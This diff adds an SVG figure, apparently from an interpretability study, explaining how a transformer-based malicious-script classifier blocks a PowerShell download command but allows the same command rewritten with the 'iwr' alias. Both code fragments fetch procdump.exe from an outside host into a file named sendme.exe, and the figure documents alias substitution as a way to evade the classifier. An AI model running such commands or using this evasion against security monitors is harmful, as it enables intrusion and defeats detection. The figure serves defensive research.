@@ -1,0 +1,156 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="2048" height="1180" viewBox="0 0 2048 1180">
+  <defs>
+    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#fbfcfe"/>
+      <stop offset="100%" stop-color="#f2f5fa"/>
+    </linearGradient>
+    <linearGradient id="seedCard" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#eef5ff"/>
+      <stop offset="100%" stop-color="#dfeafa"/>
+    </linearGradient>
+    <linearGradient id="variantCard" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#fff2f0"/>
+      <stop offset="100%" stop-color="#fde3df"/>
+    </linearGradient>
+    <linearGradient id="carrierCard" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#f0fcf6"/>
+      <stop offset="100%" stop-color="#dff4ea"/>
+    </linearGradient>
+    <linearGradient id="resid13Card" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#fff9ea"/>
+      <stop offset="100%" stop-color="#feefc4"/>
+    </linearGradient>
+    <linearGradient id="decisionSeed" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#fff1f0"/>
+      <stop offset="100%" stop-color="#ffd9d4"/>
+    </linearGradient>
+    <linearGradient id="decisionVariant" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#fff1f0"/>
+      <stop offset="100%" stop-color="#ffd6d6"/>
+    </linearGradient>
+    <marker id="arrowBrown" markerWidth="14" markerHeight="14" refX="11" refY="7" orient="auto">
+      <path d="M0,0 L14,7 L0,14 z" fill="#8c5a2b"/>
+    </marker>
+    <marker id="arrowGreen" markerWidth="14" markerHeight="14" refX="11" refY="7" orient="auto">
+      <path d="M0,0 L14,7 L0,14 z" fill="#289a67"/>
+    </marker>
+    <marker id="arrowRed" markerWidth="14" markerHeight="14" refX="11" refY="7" orient="auto">
+      <path d="M0,0 L14,7 L0,14 z" fill="#d64545"/>
+    </marker>
+    <filter id="shadow" x="-20%" y="-20%" width="140%" height="160%">
+      <feDropShadow dx="0" dy="10" stdDeviation="16" flood-color="#9cb0c8" flood-opacity="0.18"/>
+    </filter>
+  </defs>
+
+  <rect width="2048" height="1180" fill="url(#bg)"/>
+  <rect x="36" y="34" width="1976" height="1112" rx="32" fill="#ffffff" stroke="#dce3ee" stroke-width="2"/>
+
+  <text x="96" y="108" fill="#1a2533" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="34" font-weight="700">
+    Strongest current evasion interpretation
+  </text>
+  <text x="96" y="150" fill="#1a2533" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="34" font-weight="700">
+    Preserved late evidence at resid_pre13, redistributed downstream use by resid_pre31
+  </text>
+  <text x="96" y="190" fill="#526275" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="20">
+    Representative reviewed failure mode from the Invoke-WebRequest alias slice. The literal cue is rewritten, but the late malicious-evidence carrier still appears at resid_pre13 before the decision flips downstream by resid_pre31.
+  </text>
+
+  <rect x="96" y="228" width="500" height="96" rx="22" fill="#f7fafc" stroke="#dbe5f0"/>
+  <text x="124" y="264" fill="#243242" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Observed benchmark outcome</text>
+  <text x="124" y="296" fill="#566677" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18">Seed: BLOCK, Variant: ALLOW, while the late carrier remains detectable upstream.</text>
+
+  <rect x="1400" y="228" width="520" height="96" rx="22" fill="#fbf7ef" stroke="#ead8b7"/>
+  <text x="1428" y="264" fill="#6f5328" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Mechanistic read</text>
+  <text x="1428" y="296" fill="#7a6846" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18">Necessity/sufficiency split: preserved carrier at resid_pre13, altered dependence by resid_pre31.</text>
+
+  <text x="96" y="378" fill="#7c8a9b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700" letter-spacing="1.8">SEED PATH</text>
+  <text x="96" y="756" fill="#7c8a9b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700" letter-spacing="1.8">EVASION PATH</text>
+
+  <g filter="url(#shadow)">
+    <rect x="96" y="410" width="380" height="186" rx="28" fill="url(#seedCard)" stroke="#91acd2" stroke-width="3"/>
+    <rect x="560" y="410" width="320" height="186" rx="28" fill="url(#carrierCard)" stroke="#4aa77d" stroke-width="3"/>
+    <rect x="964" y="410" width="320" height="186" rx="28" fill="url(#resid13Card)" stroke="#d5a43d" stroke-width="3"/>
+    <rect x="1368" y="410" width="560" height="186" rx="28" fill="url(#decisionSeed)" stroke="#d25b52" stroke-width="3"/>
+
+    <rect x="96" y="788" width="380" height="186" rx="28" fill="url(#variantCard)" stroke="#dd7f6e" stroke-width="3"/>
+    <rect x="560" y="788" width="320" height="186" rx="28" fill="url(#carrierCard)" stroke="#4aa77d" stroke-width="3"/>
+    <rect x="964" y="788" width="320" height="186" rx="28" fill="url(#resid13Card)" stroke="#d5a43d" stroke-width="3"/>
+    <rect x="1368" y="788" width="560" height="186" rx="28" fill="url(#decisionVariant)" stroke="#d64545" stroke-width="3"/>
+  </g>
+
+  <line x1="476" y1="503" x2="560" y2="503" stroke="#8c5a2b" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowBrown)"/>
+  <line x1="880" y1="503" x2="964" y2="503" stroke="#8c5a2b" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowBrown)"/>
+  <line x1="1284" y1="503" x2="1368" y2="503" stroke="#8c5a2b" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowBrown)"/>
+
+  <line x1="476" y1="881" x2="560" y2="881" stroke="#8c5a2b" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowBrown)"/>
+  <line x1="880" y1="881" x2="964" y2="881" stroke="#8c5a2b" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowBrown)"/>
+  <line x1="1284" y1="881" x2="1368" y2="881" stroke="#d64545" stroke-width="7" stroke-linecap="round" marker-end="url(#arrowRed)"/>
+
+  <line x1="1124" y1="596" x2="1124" y2="788" stroke="#289a67" stroke-width="6" stroke-dasharray="12 12" marker-end="url(#arrowGreen)"/>
+  <line x1="1648" y1="596" x2="1648" y2="788" stroke="#d64545" stroke-width="6" stroke-dasharray="12 12" marker-end="url(#arrowRed)"/>
+
+  <text x="1112" y="684" text-anchor="middle" fill="#2f865c" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700">same late</text>
+  <text x="1112" y="708" text-anchor="middle" fill="#2f865c" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700">carrier family</text>
+
+  <text x="1648" y="684" text-anchor="middle" fill="#c64040" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700">downstream dependence</text>
+  <text x="1648" y="708" text-anchor="middle" fill="#c64040" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="18" font-weight="700">changes sign</text>
+
+  <text x="128" y="454" fill="#29405d" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Seed script fragment</text>
+  <rect x="128" y="478" width="316" height="84" rx="16" fill="#ffffff" stroke="#bfd1e8"/>
+  <text x="148" y="510" fill="#234" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">Invoke-WebRequest -Uri</text>
+  <text x="148" y="536" fill="#234" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">http://stderr.pl/procdump.exe</text>
+  <text x="148" y="562" fill="#234" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">-OutFile c:\temp\sendme.exe</text>
+  <text x="128" y="586" fill="#5d7086" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">Reviewed seed example used in the paper’s side-by-side table.</text>
+
+  <text x="592" y="454" fill="#21543f" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Validated late carrier still present</text>
+  <text x="592" y="490" fill="#274e3e" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="19" font-weight="700">Layer 12 writer family</text>
+  <text x="592" y="518" fill="#476356" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">`L12H15/L12H5/L12H4/L12H28` remains</text>
+  <text x="592" y="544" fill="#476356" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">path-sufficient under patching</text>
+  <rect x="592" y="554" width="164" height="34" rx="17" fill="#ffffff" stroke="#a8d5bf"/>
+  <text x="674" y="577" text-anchor="middle" fill="#1f7b51" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17" font-weight="700">carrier preserved</text>
+
+  <text x="996" y="454" fill="#7b5711" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">resid_pre13</text>
+  <text x="996" y="490" fill="#6f5c2b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">slice-specific malicious direction is</text>
+  <text x="996" y="516" fill="#6f5c2b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">still written by the usual late heads</text>
+  <text x="996" y="542" fill="#6f5c2b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">Ablation still reduces this direction</text>
+
+  <text x="1400" y="454" fill="#8b2d2d" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">resid_pre31 and final decision</text>
+  <text x="1400" y="490" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">Normal downstream use of that evidence</text>
+  <text x="1400" y="516" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">supports the malicious classification</text>
+  <rect x="1400" y="544" width="168" height="34" rx="17" fill="#fff8f7" stroke="#efb0aa"/>
+  <text x="1484" y="567" text-anchor="middle" fill="#b03e3e" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17" font-weight="700">BLOCK on seed</text>
+  <text x="1592" y="567" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">mean logit Δ = -0.125</text>
+
+  <text x="128" y="832" fill="#8c352d" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Alias variant fragment</text>
+  <rect x="128" y="856" width="316" height="84" rx="16" fill="#ffffff" stroke="#f0b6aa"/>
+  <text x="148" y="888" fill="#3a2421" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">iwr -Uri</text>
+  <text x="148" y="914" fill="#3a2421" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">http://stderr.pl/procdump.exe</text>
+  <text x="148" y="940" fill="#3a2421" font-family="Menlo, Consolas, 'Liberation Mono', monospace" font-size="17">-OutFile c:\temp\sendme.exe</text>
+  <text x="128" y="964" fill="#7a5c58" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">Literal `Invoke-WebRequest` cue removed by alias substitution.</text>
+
+  <text x="592" y="832" fill="#21543f" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">Early late-stage evidence survives</text>
+  <text x="592" y="868" fill="#476356" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">`L12H15` remains the dominant writer into</text>
+  <text x="592" y="894" fill="#476356" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">the slice-specific malicious direction</text>
+  <text x="592" y="920" fill="#476356" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">Path patching can still reintroduce the route</text>
+
+  <text x="996" y="832" fill="#7b5711" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">resid_pre13 is preserved</text>
+  <text x="996" y="868" fill="#6f5c2b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">late malicious-evidence direction remains</text>
+  <text x="996" y="894" fill="#6f5c2b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">positive under the usual writer family</text>
+  <rect x="996" y="916" width="184" height="34" rx="17" fill="#fff8e8" stroke="#e5c67a"/>
+  <text x="1088" y="939" text-anchor="middle" fill="#9a6a08" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17" font-weight="700">carrier still present</text>
+
+  <text x="1400" y="832" fill="#8b2d2d" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="22" font-weight="700">resid_pre31 is redistributed</text>
+  <text x="1400" y="868" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">the same late-bundle ablation becomes</text>
+  <text x="1400" y="894" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">supportive / anti-causal on variants</text>
+  <rect x="1400" y="916" width="176" height="34" rx="17" fill="#fff7f7" stroke="#efb0aa"/>
+  <text x="1488" y="939" text-anchor="middle" fill="#c63b3b" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17" font-weight="700">ALLOW on variant</text>
+  <text x="1600" y="939" fill="#784a4a" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="17">mean logit Δ = +0.344</text>
+
+  <text x="96" y="1048" fill="#6a7788" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="20" font-weight="700">Key interpretation</text>
+  <text x="96" y="1082" fill="#445365" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="20">
+    The alias rewrite removes a literal surface cue, but not the validated late malicious-evidence carrier. The decisive change appears later, between
+  </text>
+  <text x="96" y="1112" fill="#445365" font-family="'Helvetica Neue', Helvetica, Arial, sans-serif" font-size="20">
+    <tspan font-weight="700">resid_pre13</tspan> and <tspan font-weight="700">resid_pre31</tspan>, where downstream computation repurposes how that evidence affects the final classification.
+  </text>
+</svg>
